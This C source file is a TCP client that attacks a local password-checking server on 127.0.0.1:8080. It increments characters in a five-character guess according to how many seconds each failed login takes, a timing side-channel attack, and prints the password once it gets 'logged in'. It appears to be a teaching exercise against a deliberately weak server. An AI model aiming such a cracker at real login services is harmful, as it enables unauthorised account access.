#include <time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#define MAX 6
#define PORT 8080
#define SA struct sockaddr

void timing_attack(int sockfd){
    char guess[] = "00000";
    char response[20];
    int ttf = 0;
    time_t start, end;

    for (;;)
    {
        time(&start);
        write(sockfd, guess, sizeof(guess));
        read(sockfd, response, sizeof(response));
        time(&end);
        ttf = (int)difftime(end, start);
        if (strcmp("logged in", response) == 0) {
            printf("Cracked pw: %s\n", guess);
            break;
        } else {
            printf("%s, time to fail: %d seconds\n", response, ttf);
            guess[ttf - 1] = (char)((int)guess[ttf - 1] + 1);
        }
        bzero(response, sizeof(response));
    }
}

int main()
{
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

    // socket create and varification 
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
    {
        printf("socket creation failed...\n");
        exit(0);
    }
    else
        printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT 
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(PORT);

    // connect the client socket to server socket 
    if (connect(sockfd, (SA*) &servaddr, sizeof(servaddr)) != 0)
    {
        printf("connection with the server failed...\n");
        exit(0);
    }
    else
        printf("connected to the server..\n");

    // function for chat 
    timing_attack(sockfd);

    // close the socket 
    close(sockfd);
}